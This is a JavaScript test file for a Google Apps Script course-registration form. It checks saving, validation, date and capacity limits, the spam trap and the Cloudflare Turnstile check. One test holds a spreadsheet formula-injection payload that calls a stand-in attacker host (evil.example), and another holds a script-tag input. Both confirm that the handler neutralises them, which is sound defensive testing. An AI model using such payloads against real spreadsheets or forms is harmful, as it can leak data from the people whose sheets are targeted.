// Checks apps-script/Code.gs without Google: runs it in Node with stand-ins for the Sheet, email and lock.
// Part of npm test. Run alone: node apps-script/Code.test.mjs
import fs from 'node:fs';
import vm from 'node:vm';
import assert from 'node:assert/strict';

const code = fs.readFileSync(new URL('./Code.gs', import.meta.url), 'utf8');

function makeEnv({ mailFails = false, props = {}, verify = () => ({ success: true }) } = {}) {
  const verified = [];
  const sheets = {};
  const mails = [];
  function makeSheet(name) {
    const cells = []; // rows of values
    const formats = {};
    const sheet = {
      name, cells, formats,
      getLastRow: () => cells.length,
      getLastColumn: () => Math.max(0, ...cells.map((r) => r.length)),
      setFrozenRows() {},
      getRange(r, c, nr = 1, nc = 1) {
        return {
          getValues: () => Array.from({ length: nr }, (_, i) => Array.from({ length: nc }, (_, j) => (cells[r - 1 + i] || [])[c - 1 + j] ?? '')),
          setValues(vals) {
            vals.forEach((row, i) => {
              cells[r - 1 + i] = cells[r - 1 + i] || [];
              row.forEach((v, j) => (cells[r - 1 + i][c - 1 + j] = v));
            });
            return this;
          },
          setFontWeight() { return this; },
          setNumberFormat(f) { formats[`${r},${c},${nc}`] = f; return this; },
        };
      },
    };
    return sheet;
  }
  const ctx = {
    SpreadsheetApp: {
      getActiveSpreadsheet: () => ({
        getSheetByName: (n) => sheets[n] || null,
        insertSheet: (n) => (sheets[n] = makeSheet(n)),
      }),
    },
    LockService: { getScriptLock: () => ({ tryLock: () => true, releaseLock() {} }) },
    PropertiesService: { getScriptProperties: () => ({ getProperty: (k) => props[k] ?? null }) },
    UrlFetchApp: {
      fetch: (url, opts) => {
        verified.push({ url, ...opts.payload });
        const out = verify(opts.payload);
        return { getContentText: () => JSON.stringify(out) };
      },
    },
    MailApp: { sendEmail: (m) => { if (mailFails) throw new Error('quota'); mails.push(m); } },
    ContentService: {
      MimeType: { JSON: 'json' },
      createTextOutput: (s) => ({ body: s, setMimeType() { return this; } }),
    },
  };
  ctx.console = { error() {}, log() {} };
  vm.createContext(ctx);
  vm.runInContext(code, ctx);
  // Tests must not depend on today's date: open the form wide unless a test sets its own dates
  vm.runInContext("FORMS['mic-online-2027'].opens = '2000-01-01'; FORMS['mic-online-2027'].closes = '2099-12-31'", ctx);
  const out = (res) => JSON.parse(res.body);
  return {
    ctx, sheets, mails, verified,
    get: (form) => out(ctx.doGet({ parameter: form ? { form } : {} })),
    post: (body) => out(ctx.doPost({ postData: { contents: typeof body === 'string' ? body : JSON.stringify(body) } })),
  };
}

const base = () => ({
  form: 'mic-online-2027',
  website: '',
  email: 'test@example.com',
  consent: 'Agree',
  answers: [['Email', 'test@example.com'], ['First name', 'Somchai'], ['What is your WhatsApp number?', '+66 81 234 5678'], ['Agree?', 'Agree']],
});
const tab = 'MIC Online 2027 (website)';
let n = 0;
const test = (name, fn) => { fn(); n++; };

test('GET unknown form', () => assert.deepEqual(makeEnv().get('nope'), { ok: false, error: 'Unknown form.' }));
test('GET open form', () => assert.deepEqual(makeEnv().get('mic-online-2027'), { ok: true, open: true }));

test('POST saves a row with headers and emails a copy', () => {
  const env = makeEnv();
  assert.deepEqual(env.post(base()), { ok: true, emailed: true });
  const cells = env.sheets[tab].cells;
  assert.deepEqual(cells[0], ['Timestamp', 'Email', 'First name', 'What is your WhatsApp number?', 'Agree?']);
  assert.ok(cells[1][0] instanceof Date || Object.prototype.toString.call(cells[1][0]) === '[object Date]');
  assert.equal(cells[1][2], 'Somchai');
  assert.equal(cells[1][3], ' +66 81 234 5678', 'leading + is guarded with a space');
  assert.equal(env.mails.length, 1);
  assert.equal(env.mails[0].to, 'test@example.com');
  assert.equal(env.mails[0].replyTo, 'wif.meditation@gmail.com');
  assert.match(env.mails[0].htmlBody, /<b>First name<\/b><br>Somchai/);
});

test('second application with a new question adds a column', () => {
  const env = makeEnv();
  env.post(base());
  const b = base();
  b.answers.push(['New question', 'Yes']);
  assert.equal(env.post(b).ok, true);
  const cells = env.sheets[tab].cells;
  assert.equal(cells[0].at(-1), 'New question');
  assert.equal(cells[2].at(-1), 'Yes');
  assert.equal(cells[1].length <= cells[0].length, true);
});

test('formula answers are never run', () => {
  const env = makeEnv();
  const b = base();
  b.answers[1] = ['First name', '=IMPORTXML("http://evil.example","//a")'];
  env.post(b);
  assert.equal(env.sheets[tab].cells[1][2], ' =IMPORTXML("http://evil.example","//a")');
});

test('HTML in answers is escaped in the email', () => {
  const env = makeEnv();
  const b = base();
  b.answers[1] = ['First name', '<script>x</script>'];
  env.post(b);
  assert.ok(!env.mails[0].htmlBody.includes('<script>'));
});

test('spam trap: pretends success, saves nothing', () => {
  const env = makeEnv();
  assert.deepEqual(env.post({ ...base(), website: 'http://spam' }), { ok: true });
  assert.equal(env.sheets[tab], undefined);
  assert.equal(env.mails.length, 0);
});

test('bad email, no consent, bad JSON, unknown form, too long', () => {
  const env = makeEnv();
  assert.equal(env.post({ ...base(), email: 'nope' }).error, 'Please enter a valid email address.');
  assert.equal(env.post({ ...base(), consent: '' }).error, 'Please agree to the terms and conditions to apply.');
  assert.equal(env.post('{oops').ok, false);
  assert.equal(env.post({ ...base(), form: 'x' }).error, 'Unknown form.');
  const long = base(); long.answers[1] = ['First name', 'x'.repeat(5001)];
  assert.match(env.post(long).error, /too long/);
  const bad = base(); bad.answers = [['Email', 5]];
  assert.equal(env.post(bad).ok, false);
  assert.equal(env.sheets[tab], undefined, 'nothing saved for rejected applications');
});

test('email quota used up: still saved, emailed false', () => {
  const env = makeEnv({ mailFails: true });
  assert.deepEqual(env.post(base()), { ok: true, emailed: false });
  assert.equal(env.sheets[tab].cells.length, 2);
});

test('maxApplications closes the form when full', () => {
  const env = makeEnv();
  vm.runInContext("FORMS['mic-online-2027'].maxApplications = 2", env.ctx);
  assert.equal(env.post(base()).ok, true);
  assert.equal(env.post(base()).ok, true);
  const third = env.post(base());
  assert.equal(third.ok, false);
  assert.match(third.error, /is full/);
  assert.equal(env.get('mic-online-2027').open, false);
});

test('before the opening date: closed with the date, unless this is a test copy', () => {
  const env = makeEnv();
  vm.runInContext("FORMS['mic-online-2027'].opens = '2099-11-01'", env.ctx);
  const s = env.get('mic-online-2027');
  assert.equal(s.open, false);
  assert.equal(s.message, 'Registration for MIC Online — Batch 1 (2027) opens on 1 November 2099.');
  assert.match(env.post(base()).error, /opens on 1 November 2099/);
  assert.equal(env.sheets[tab], undefined, 'nothing saved before opening');

  const testCopy = makeEnv({ props: { ALLOW_BEFORE_OPENING: 'yes' } });
  vm.runInContext("FORMS['mic-online-2027'].opens = '2099-11-01'", testCopy.ctx);
  assert.equal(testCopy.get('mic-online-2027').open, true);
  assert.equal(testCopy.post(base()).ok, true);
});

test('the real config opens 1 November 2026 and closes 10 January 2027, Bangkok time', () => {
  const env = makeEnv();
  const real = fs.readFileSync(new URL('./Code.gs', import.meta.url), 'utf8');
  assert.match(real, /opens: '2026-11-01'/);
  assert.match(real, /closes: '2027-01-10'/);
  assert.equal(vm.runInContext("longDate_('2026-11-01')", env.ctx), '1 November 2026');
});

test('human check skipped when TURNSTILE_SECRET is not set (test copy, demo)', () => {
  const env = makeEnv();
  assert.equal(env.post(base()).ok, true);
  assert.equal(env.verified.length, 0);
});

test('human check: with TURNSTILE_SECRET, a token Cloudflare accepts is needed', () => {
  const props = { TURNSTILE_SECRET: 'secret-from-script-properties' };
  const env = makeEnv({ props, verify: (p) => ({ success: p.response === 'good-token' }) });
  assert.match(env.post(base()).error, /Verify you are human/, 'no token');
  assert.match(env.post({ ...base(), turnstile: 'bad-token' }).error, /Verify you are human/, 'rejected token');
  assert.match(env.post({ ...base(), turnstile: 'x'.repeat(3000) }).error, /Verify you are human/, 'oversized token');
  assert.equal(env.sheets[tab], undefined, 'nothing saved without a passed check');
  assert.deepEqual(env.post({ ...base(), turnstile: 'good-token' }), { ok: true, emailed: true });
  const call = env.verified.at(-1);
  assert.equal(call.url, 'https://challenges.cloudflare.com/turnstile/v0/siteverify');
  assert.equal(call.secret, 'secret-from-script-properties');
  assert.equal(call.response, 'good-token');
});

test('human check: Cloudflare unreachable means refuse, not accept', () => {
  const env = makeEnv({ props: { TURNSTILE_SECRET: 's' }, verify: () => { throw new Error('network'); } });
  assert.match(env.post({ ...base(), turnstile: 't' }).error, /Verify you are human/);
  assert.equal(env.sheets[tab], undefined);
});

test('the manifest allows the call to Cloudflare', () => {
  const manifest = JSON.parse(fs.readFileSync(new URL('./appsscript.json', import.meta.url), 'utf8'));
  assert.ok(manifest.oauthScopes.includes('https://www.googleapis.com/auth/script.external_request'));
});

test('closing date passed', () => {
  const env = makeEnv();
  vm.runInContext("FORMS['mic-online-2027'].closes = '2020-01-01'", env.ctx);
  const s = env.get('mic-online-2027');
  assert.equal(s.open, false);
  assert.match(s.message, /has closed/);
  assert.match(env.post(base()).error, /has closed/);
});

test('row 1 that does not start with Timestamp: clear error, nothing overwritten', () => {
  const env = makeEnv();
  const book = env.ctx.SpreadsheetApp.getActiveSpreadsheet();
  const sheet = book.insertSheet(tab);
  sheet.cells.push(['Something else']);
  const res = env.post(base());
  assert.equal(res.ok, false);
  assert.match(res.error, /could not be saved/);
  assert.deepEqual(sheet.cells, [['Something else']]);
  assert.equal(env.mails.length, 0);
});

console.log(`apps-script/Code.gs: ${n} checks passed`);
